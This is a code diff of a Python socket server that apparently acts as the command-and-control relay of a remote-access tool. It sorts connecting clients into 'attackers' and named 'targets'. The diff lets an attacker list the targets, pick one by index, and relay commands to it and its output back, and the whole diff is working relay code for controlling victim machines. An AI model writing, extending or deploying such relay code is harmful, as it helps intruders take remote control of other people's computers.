@@ -2,9 +2,9 @@ import socket
 import threading
 import struct
 
-
 ATTACKER_LIST = []
 TARGET_LIST = []
+TARGET_NAMES_LIST = []
 ATTACKER_TO_TARGET = {}
 TARGET_TO_ATTACKETS = {}
 
@@ -23,55 +23,120 @@ class Server():
 
     def play_client(self, client):
         self.client = client
-        Main(self.client)
+        Recognition(self.client).recognition()
 
 
-class Main():
+
+class Recognition():
     def __init__(self, client):
         self.client = client
+        
+    def recognition(self):
         try:
             data = (SuperSocket(self.client).recv_msg()).decode()
             if data == "1":
                 ATTACKER_LIST.append(self.client)
             else:
+                target_name = SuperSocket(self.client).recv_msg().decode()
                 TARGET_LIST.append(self.client)
+                TARGET_NAMES_LIST.append(target_name)
+                TARGET_TO_ATTACKETS[self.client] = []
+                
+            print("closed attacker")
             print("TARGETS:")
             print(TARGET_LIST)
+            print("TARGET NAMES:")
+            print(TARGET_NAMES_LIST)
             print("ATTACKERS:")
             print(ATTACKER_LIST)
+            print("ATTACKER TO TARGET")
+            print(ATTACKER_TO_TARGET)
+            print("TARGET_TO_ATTACKETS")
+            print(TARGET_TO_ATTACKETS)
             print("----------------------------------------------------------")
-            self.operations()
+            
+            Main(self.client).operations()
+            
         finally:
             if self.client in TARGET_LIST:
+                target_index = TARGET_LIST.index(self.client)
                 TARGET_LIST.remove(self.client)
-                print("closed")
-                print("TARGETS:")
-                print(TARGET_LIST)
-                print("ATTACKERS:")
-                print(ATTACKER_LIST)
-                print("----------------------------------------------------------")
+                
+                
+                try:
+                    TARGET_NAMES_LIST.pop(target_index)
+                    TARGET_TO_ATTACKETS.pop(self.client)
+                    
+                except:
+                    pass
+
             else:
                 ATTACKER_LIST.remove(self.client)
-                print("closed attacker")
-                print("TARGETS:")
-                print(TARGET_LIST)
-                print("ATTACKERS:")
-                print(ATTACKER_LIST)
-                print("----------------------------------------------------------")
-            self.client.close()
+                
+                
+                try:
+                    target_socket = ATTACKER_TO_TARGET[self.client]
+                    ATTACKER_TO_TARGET.pop(self.client)
+                    TARGET_TO_ATTACKETS[target_socket].remove(self.client)
+                
+                except:
+                    pass
+                
+            print("closed attacker")
+            print("TARGETS:")
+            print(TARGET_LIST)
+            print("TARGET NAMES:")
+            print(TARGET_NAMES_LIST)
+            print("ATTACKERS:")
+            print(ATTACKER_LIST)
+            print("ATTACKER TO TARGET")
+            print(ATTACKER_TO_TARGET)
+            print("TARGET_TO_ATTACKETS")
+            print(TARGET_TO_ATTACKETS)
+            print("----------------------------------------------------------")
 
+
+
+class Main():
+    def __init__(self, client):
+        self.client = client
+        
     def operations(self):
         while True:
 
             data = SuperSocket(self.client).recv_msg()
             try:
                 if self.client in TARGET_LIST:
-                    for socket in ATTACKER_LIST:
-                        SuperSocket(socket).send_msg(data)
+                    try:
+                        for socket in TARGET_TO_ATTACKETS[self.client]:
+                            SuperSocket(socket).send_msg(data)
+                            
+                    except:
+                        pass
                         
                 elif self.client in ATTACKER_LIST:
-                    for socket in TARGET_LIST:
-                        SuperSocket(socket).send_msg(data)
+                    
+                    decoded_data = data.decode()
+                    
+                    if decoded_data == "get_list_of_target":
+                        SuperSocket(self.client).send_msg(str(TARGET_NAMES_LIST).encode())
+                        
+                    elif decoded_data == "choose_a_target":
+                        chosen_target_index = SuperSocket(self.client).recv_msg().decode()
+                        chosen_target_index = int(chosen_target_index)
+                        target = TARGET_LIST[chosen_target_index]
+                        ATTACKER_TO_TARGET[self.client] = target
+                        TARGET_TO_ATTACKETS[target].append(self.client)
+                        
+                    elif decoded_data == "exit":
+                        break
+                        
+                    else:
+                        try:
+                            SuperSocket(ATTACKER_TO_TARGET[self.client]).send_msg(data)
+                        
+                        except:
+                            pass
                 else:
                     pass
             except:
